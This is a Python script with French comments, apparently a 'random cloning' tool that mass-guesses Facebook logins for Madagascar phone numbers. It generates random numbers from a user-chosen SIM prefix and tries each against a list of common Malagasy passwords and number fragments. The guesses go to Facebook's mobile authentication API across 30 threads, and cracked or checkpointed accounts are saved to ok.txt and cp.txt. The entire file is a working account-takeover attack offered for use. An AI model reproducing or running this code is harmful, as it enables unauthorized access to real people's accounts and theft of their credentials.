import os
import random
import string
import uuid
import json
import subprocess
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import sys
import secrets
import getpass

os.system('git pull')

# Définir le logo
logo = '''
█╗   ██╗███████╗██╗  ██╗ █████╗ ██╗   ██╗███████╗██████╗ 
██║   ██║██╔════╝██║  ██║██╔══██╗██║   ██║██╔════╝██╔══██╗
██║   ██║███████╗███████║███████║██║   ██║█████╗  ██████╔╝
╚██╗ ██╔╝╚════██║██╔══██║██╔══██║██║   ██║██╔══╝  ██╔══██╗
 ╚████╔╝ ███████║██║  ██║██║  ██║╚██████╔╝███████╗██║  ██║
  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
'''

# Définir le numéro de version et les couleurs
version_actuelle = "1.0"

bblack = "\033[1;30m"  # Black
M = "\033[1;31m"  # Red
H = "\033[1;32m"  # Green
byellow = "\033[1;33m"  # Yellow
bblue = "\033[1;34m"  # Blue
P = "\033[1;35m"  # Purple
C = "\033[1;36m"  # Cyan
B = "\033[1;37m"  # White

my_color = [B, C, P, H]
warna = random.choice(my_color)

oks = []
cps = []
loop = 0

# Définir les fonctions auxiliaires
def linex():
    print(f'{warna}--------------------------------------------{B}')

def clear():
    os.system('clear')
    print(logo)

# Générer une séquence aléatoire de chiffres
def generate_random_sequence(length):
    return [random.randint(0, 9) for _ in range(length)]

# Définir la fonction principale
def MR_Hacker():
    clear()
    os.system('xdg-open https://facebook.com/groups/641144864016773/')
    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
    linex()
    option = input(f' {B}[{warna}??{B}] CHOISIR MENU >> ')
    if option in ['01', '1']:
        BD_CLONING()
    else:
        exit(' MERCI BEAUCOUP  :)')

# Définir la fonction de clonage
def BD_CLONING():
    user = []
    clear()
    print(' CODE SIM MALAGASY : [26132] [26134] [26138] [26133]')
    print(' 261=0 Madagascar : [032] [034] [038] [033]')
    code = input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit = int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit = 50000
    
    if limit == 1111:
        secret = input(' ENTER SECRET FOR FREE FIRE RELATED ACCOUNTS >> ')
    else:
        secret = None

    clear()
    for nmbr in range(limit):
        nmp = ''.join(map(str, generate_random_sequence(7)))
        user.append(nmp)
    with tred(max_workers=30) as Dipto:
        tl = str(len(user))
        print(' TOTAL ACCOUNT : ' + tl)
        print(' YOUR SIM CODE : ' + code)
        if secret:
            print(' SECRET FOR FREE FIRE RELATED ACCOUNTS : ' + secret)
        print(' CLONING EN COURS ... ')
        linex()
        for psx in user:
            ids = code + psx
            passlist = [
                psx, ids, ids[:7], ids[:6], ids[5:], ids[4:], 'malala', 'Malala', 'fitiavana', 'mamako',
                'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika',
                'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo']
            Dipto.submit(method_crack, ids, passlist)

# Définir la fonction de craquage
def method_crack(ids, passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s' % (loop, len(oks)))
            sys.stdout.flush()
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            datax = {'adid': adid, 'format': 'json', 'device_id': device_id}
            datax['email'] = ids
            datax['password'] = pas
            datax['generate_analytics_claims'] = '1'
            datax['credentials_type'] = 'password'
            datax['source'] = 'login'
            datax['error_detail_type'] = 'button_with_disabled'
            datax['enroll_misauth'] = 'false'
            datax['generate_session_cookies'] = '1'
            datax['generate_machine_id'] = '1'
            datax['meta_inf_fbmeta'] = ''
            datax['currently_logged_in_userid'] = '0'
            datax['fb_api_req_friendly_name'] = 'authenticate'
            header = {'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]'}

            url = 'https://b-api.facebook.com/method/auth.login'
            response = requests.post(url, data=datax, headers=header)
            
            # Vérifier la réponse
            if 'access_token' in response.text:
                oks.append(ids + ' | ' + pas)
                open('ok.txt', 'a').write(ids + ' | ' + pas + '\n')
                break
            elif 'www.facebook.com' not in response.json()['error_msg']:
                cps.append(ids + ' | ' + pas)
                open('cp.txt', 'a').write(ids + ' | ' + pas + '\n')
                break
            loop += 1
    except Exception as e:
        print(f"Erreur lors de l'essai : {e}")